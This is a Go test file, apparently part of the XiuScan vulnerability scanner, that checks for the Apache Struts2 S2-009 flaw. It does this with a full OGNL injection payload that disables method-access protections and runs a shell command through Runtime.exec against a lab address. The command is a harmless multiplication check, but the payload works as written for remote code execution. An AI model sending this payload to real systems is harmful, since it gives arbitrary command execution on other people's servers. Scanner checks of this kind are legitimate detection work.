package test

import (
	"github.com/EmYiQing/XiuScan/core/http"
	"github.com/EmYiQing/XiuScan/core/tool"
	"github.com/EmYiQing/XiuScan/log"
	"net/url"
	"strconv"
	"strings"
	"testing"
)

func TestS2009(t *testing.T) {
	rand1 := tool.GetRandomInt()
	rand2 := tool.GetRandomInt()
	cmd := "expr __rand_1__ * __rand_2__"
	cmd = strings.ReplaceAll(cmd, "__rand_1__", strconv.Itoa(rand1))
	cmd = strings.ReplaceAll(cmd, "__rand_2__", strconv.Itoa(rand2))
	cmd = url.QueryEscape(cmd)
	payload := "/ajax/example5?age=12313&name=(%23context[%22xwork." +
		"MethodAccessor.denyMethodExecution%22]=+new+java.lang.Bo" +
		"olean(false),+%23_memberAccess[%22allowStaticMethodAcces" +
		"s%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%2" +
		"7__cmd__%27).getInputStream(),%23b=new+java.io.InputStre" +
		"amReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23" +
		"d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.s" +
		"truts2.ServletActionContext@getResponse().getWriter(),%2" +
		"3kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27" +
		"meh%27)]"
	payload = strings.ReplaceAll(payload, "__cmd__", cmd)
	output := tool.FormatPayload(payload)
	log.Info("payload: %s", output)
	req := &http.Request{
		Url:    http.NewUrl("http://192.168.222.132:8080" + payload),
		Method: "POST",
	}
	resp := http.DoRequest(req)
	if strings.Contains(string(resp.Body), strconv.Itoa(rand1*rand2)) {
		log.Info("find S2-009")
	}
}
